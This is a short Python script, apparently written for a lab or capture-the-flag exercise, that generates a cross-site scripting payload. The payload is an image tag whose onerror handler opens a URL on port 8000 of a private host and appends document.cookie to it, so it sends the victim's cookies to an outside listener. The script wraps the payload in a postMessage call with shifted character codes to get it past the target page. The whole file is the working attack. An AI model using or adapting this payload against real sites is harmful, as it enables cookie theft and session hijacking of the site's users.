# /usr/bin/env python
# js revert

host = '10.10.10.3'
script = '<img src="x" onerror="window.open(\'http://10.33.1.8:8000/\'+document.cookie)">'
pload = f"window.postMessage([...'{script}'].map(i => String.fromCharCode(i.charCodeAt(0) - 3)).map(i=>String(i)), 'http://{host}')"

print(pload)
